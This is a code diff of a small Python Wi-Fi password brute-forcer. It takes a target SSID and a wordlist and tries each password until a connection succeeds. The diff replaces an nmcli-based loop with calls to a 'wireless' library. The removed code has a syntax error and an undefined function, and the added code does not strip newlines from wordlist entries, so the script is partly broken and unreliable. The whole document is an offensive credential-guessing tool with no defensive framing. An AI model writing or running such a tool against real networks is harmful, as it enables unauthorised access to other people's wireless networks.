@@ -1,22 +1,19 @@
 import sys
-import subprocess
-from scapy.all import conf, Route
+from wireless import Wireless
 
 def main(args):
     try:
         SSID = args[1]
         dictionary = open(args[2], 'r')
     except IndexError:
-        print("Need to supply a network SSID and a password list")
-    try:
-        iface = args[3]
-    except IndexError:
-        iface = conf.iface
-    for password in dictionary:
-        subprocess.run(["nmcli", "dev", "wifi", "connect", SSID, "password", password])
-        if(get_if_addr(iface) != '0.0.0.0')
-            print("SUCCESS - Password for " + SSID + "is" + password)
+        print("Need to supply a network SSID, a password list")
+        exit(0)
+    for network_password in dictionary:
+        wireless = Wireless()
+        res = wireless.connect(ssid=SSID, password=network_password)
+        if(res):
+            print("Success - Password for " + SSID + " is " + network_password)
             exit(0)
     print("Password not in dictionary")
-
+main(sys.argv)
     
